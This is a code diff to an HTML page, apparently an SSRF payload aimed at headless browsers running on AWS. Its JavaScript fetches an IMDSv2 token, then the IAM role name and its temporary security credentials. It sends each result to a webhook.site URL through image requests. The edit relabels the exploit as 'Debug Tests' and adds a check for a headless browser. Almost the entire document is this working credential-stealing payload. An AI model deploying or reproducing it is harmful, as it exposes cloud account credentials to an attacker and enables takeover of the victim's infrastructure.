@@ -1,13 +1,18 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Running IMDS Exploit...</title>
+  <title>Debug IMDS Exploit</title>
 </head>
 <body>
-  <h1>Running IMDS Exploit...</h1>
+  <h1>Running Debug Tests...</h1>
   <script>
-    // תחילה מבקשים token מ־IMDSv2
+    // Test 1: Check if running in headless browser
+    const webdriver = navigator.webdriver ? 'true' : 'false';
+    new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?test=webdriver&value=' + webdriver;
+
+    // Test 2: Try to access IMDS token endpoint
     fetch("http://169.254.169.254/latest/api/token", {
       method: "PUT",
       headers: {
@@ -16,28 +21,42 @@
     })
     .then(response => response.text())
     .then(token => {
-      // עכשיו ניגשים ל־/latest/meta-data/ עם הטוקן
-      return fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {
-        method: "GET",
+      new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?test=imds-token&value=' + encodeURIComponent(token);
+
+      // Test 3: Try to use token to fetch IAM role name
+      fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {
         headers: {
           "X-aws-ec2-metadata-token": token
         }
+      })
+      .then(response => response.text())
+      .then(role => {
+        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?test=iam-role&value=' + encodeURIComponent(role);
+
+        // Test 4: Get creds from IAM role
+        fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role, {
+          headers: {
+            "X-aws-ec2-metadata-token": token
+          }
+        })
+        .then(response => response.text())
+        .then(creds => {
+          new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?test=creds&value=' + encodeURIComponent(creds);
+        })
+        .catch(err => {
+          new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?test=creds-error&value=' + encodeURIComponent(err.toString());
+        });
+      })
+      .catch(err => {
+        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?test=role-error&value=' + encodeURIComponent(err.toString());
       });
     })
-    .then(response => response.text())
-    .then(roleName => {
-      // עכשיו ניגש לפרטי ה־credentials עצמם
-      return fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + roleName)
-        .then(r => r.text());
-    })
-    .then(credentials => {
-      // שולחים את כל המידע ל־webhook שלך
-      new Image().src = "https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?imds=" + encodeURIComponent(credentials);
-    })
     .catch(err => {
-      // אם משהו נכשל, שלח שגיאה
-      new Image().src = "https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?error=" + encodeURIComponent(err.message);
+      new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?test=token-error&value=' + encodeURIComponent(err.toString());
     });
+
+    // Test 5: Try image load to IMDS directly
+    new Image().src = "http://169.254.169.254/latest/meta-data/hostname";
   </script>
 </body>
 </html>
